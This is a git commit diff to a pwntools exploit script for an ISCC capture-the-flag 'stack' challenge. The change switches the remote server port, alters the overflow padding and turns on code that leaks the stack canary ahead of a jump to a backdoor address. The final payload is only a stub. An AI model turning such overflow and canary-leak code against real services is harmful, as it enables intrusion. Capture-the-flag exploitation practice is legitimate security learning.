49f3441ce68a140a2699b8c244e1db1056ecc980
Mel-SRK <3203216748@qq.com>
2026-05-03 18:26:34 +0800

    Updata somethin...

--- ctf/bs/iscc/day1/stack/exp.py
+++ ctf/bs/iscc/day1/stack/exp.py
@@ -1,19 +1,19 @@
 from pwn import *
 context(arch='i386',os='linux',log_level='debug')
-p=remote("39.96.193.120",10004)
+p=remote("39.96.193.120",10018)
 elf=ELF('./attachment-5')
 
 back_door=0x80491C6
 
-payload=b'a'*(0x70-4)
+payload=b'a'*(0x70-0xc+1)
 p.sendlineafter("Hello Hacker!",payload)
 # p.recv(payload)
-# canary=p.recvline()
-# log.info(canary)
+canary=p.recvline()
+log.info(canary)
 
 
 
 payload=flat([
-    b'a'*(0x70-4),
+    b'a'*(1),
     
 ])
